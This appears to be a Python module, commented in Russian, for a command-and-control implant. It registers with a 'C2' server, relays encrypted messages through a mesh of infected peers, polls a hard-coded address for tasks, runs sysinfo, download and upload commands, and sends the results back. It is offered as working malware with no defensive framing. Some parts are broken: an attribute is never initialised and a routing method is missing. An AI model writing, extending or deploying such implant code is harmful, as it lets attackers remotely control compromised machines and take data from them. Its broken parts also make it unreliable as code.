import asyncio
from shared.messages import Message
from agents.crypto import encrypt, decrypt
from agents.comms.discovery import register_with_c2, get_known_peers
import socket
import requests
from commands import sysinfo, ping, download, upload, netstat

class MeshComms:
    def __init__(self, agent_id, listen_port, bootstrap_url=None):
        self.agent_id = agent_id
        self.listen_port = listen_port
        self.known_peers = {}  # agent_id -> (ip, port)
        self.message_handler = None
        self.processed_msgs = set()
        self.bootstrap_url = bootstrap_url or "http://192.168.1.67:8000/api"

    async def start(self):
        # Получить внешний IP
        ip = self._get_local_ip()
        
        # Зарегистрироваться на C2
        register_with_c2(self.agent_id, ip, self.listen_port)
        
        # Получить известных пиров
        peers = get_known_peers()
        for peer in peers:
            if peer["id"] != self.agent_id:
                self.add_peer(peer["id"], peer["ip"], peer["port"])
        
        # Запустить сервер
        await self.start_server()

    async def start_server(self):
        server = await asyncio.start_server(self.handle_conn, '0.0.0.0', self.listen_port)
        print(f"[{self.agent_id}] Mesh-сервер слушает на порту {self.listen_port}")
        async with server:
            await server.serve_forever()

    async def handle_conn(self, reader, writer):
        try:
            data = await reader.read(65536)
            decrypted_json = decrypt(data.decode())
            msg = Message.from_dict(decrypted_json)

            if msg.msg_id in self.processed_msgs:
                writer.close()
                await writer.wait_closed()
                return

            self.processed_msgs.add(msg.msg_id)

            if msg.route[-1] == self.agent_id:
                if self.message_handler:
                    await self.message_handler(msg.payload)
            else:
                await self._proxy_forward(msg)

        except Exception as e:
            print(f"[{self.agent_id}] Ошибка обработки входящего соединения: {e}")
        finally:
            writer.close()
            await writer.wait_closed()

    async def _proxy_forward(self, msg: Message):
        next_hop = self._next_hop(msg.route)
        if not next_hop:
            print(f"[{self.agent_id}] Не удалось определить следующий hop")
            return
        if next_hop not in self.known_peers:
            print(f"[{self.agent_id}] Неизвестный peer: {next_hop}")
            return

        ip, port = self.known_peers[next_hop]
        await self.send_message(ip, port, msg)

    def _next_hop(self, route):
        try:
            idx = route.index(self.agent_id)
            return route[idx + 1] if idx + 1 < len(route) else None
        except ValueError:
            return None

    async def send_message(self, ip, port, msg: Message):
        try:
            reader, writer = await asyncio.open_connection(ip, port)
            encrypted = encrypt(msg.to_dict())
            writer.write(encrypted.encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except Exception as e:
            print(f"[{self.agent_id}] Ошибка отправки сообщения на {ip}:{port}: {e}")

    async def send_along_route(self, msg: Message):
        next_hop = self._next_hop(msg.route)
        if not next_hop:
            print(f"[{self.agent_id}] send_along_route: нет следующего узла")
            return
        if next_hop not in self.known_peers:
            print(f"[{self.agent_id}] send_along_route: peer {next_hop} не найден")
            return

        ip, port = self.known_peers[next_hop]
        await self.send_message(ip, port, msg)

    def add_peer(self, peer_id, ip, port):
        if peer_id not in self.known_peers:
            print(f"[{self.agent_id}] Добавлен новый peer: {peer_id} ({ip}:{port})")
        else:
            print(f"[{self.agent_id}] Обновлен peer: {peer_id} ({ip}:{port})")
        self.known_peers[peer_id] = (ip, port)

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def fetch_tasks(self):
        """ Запрашивает задачи с сервера. """
        try:
            res = requests.get(f"{self.bootstrap_url}/tasks/{self.agent_id}")
            if res.status_code == 200:
                return res.json()
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Task fetch error: {e}")
        return []

    def send_result(self, task_id, result):
        """ Отправляет результат выполнения задачи. """
        try:
            res = requests.post(f"{self.bootstrap_url}/results/", json={
                "agent_id": self.agent_id,
                "task_id": task_id,
                "result": encrypt(result)
            })
            if res.status_code == 200:
                print(f"[Agent:{self.agent_id}] Result sent for task {task_id}")
        except Exception as e:
            print(f"[Agent:{self.agent_id}] Result send error: {e}")

    def run_task(self, task):
        command = task.get("command")
        task_id = task.get("id")
        params = task.get("params", {})

        if command == "sysinfo":
            result = sysinfo.run()
        elif command == "ping":
            result = ping.run()
        elif command == "download":
            result = download.run(params)
        elif command == "upload":
            result = upload.run(params)
        else:
            result = f"Unknown command: {command}"

        self.send_result(task_id, result)

    async def process_payload(self, payload):
        """
        Обработка входящей полезной нагрузки (например, команды, пришедшей через mesh).
        Поддерживает те же команды, что и run_task, но payload может быть другим форматом.
        """
        cmd_type = payload.get("type")
        source = payload.get("from")

        if cmd_type == "sysinfo":
            # Выполнить команду sysinfo и отправить результат обратно
            result = sysinfo.run()
            print(f"[Agent:{self.agent_id}] sysinfo command executed via mesh")
            if source:
                response_payload = {
                    "type": "sysinfo_result",
                    "data": result,
                    "to": source,
                    "from": self.agent_id,
                }
                await self.send_via_route(source, response_payload)

        elif cmd_type == "sysinfo_result":
            # Получен ответ на запрос sysinfo
            future = self.pending_responses.pop(source, None)
            if future:
                future.set_result(payload.get("data"))
            else:
                print(f"[Agent:{self.agent_id}] Received unexpected sysinfo_result from {source}")

        elif cmd_type == "ping":
            print(f"[Agent:{self.agent_id}] Received ping from {source}")

        else:
            print(f"[Agent:{self.agent_id}] Unknown payload type: {cmd_type}")

    async def request_sysinfo(self, target_agent_id):
        """
        Запросить sysinfo у другого агента через mesh и дождаться ответа.
        """
        if target_agent_id == self.agent_id:
            # Локальный запрос — сразу вернуть
            return sysinfo.run()

        future = asyncio.get_event_loop().create_future()
        self.pending_responses[target_agent_id] = future

        payload = {
            "type": "sysinfo",
            "from": self.agent_id,
            "to": target_agent_id,
        }
        await self.send_via_route(target_agent_id, payload)

        try:
            result = await asyncio.wait_for(future, timeout=10)
            return result
        except asyncio.TimeoutError:
            self.pending_responses.pop(target_agent_id, None)
            print(f"[Agent:{self.agent_id}] Timeout waiting for sysinfo from {target_agent_id}")
            return None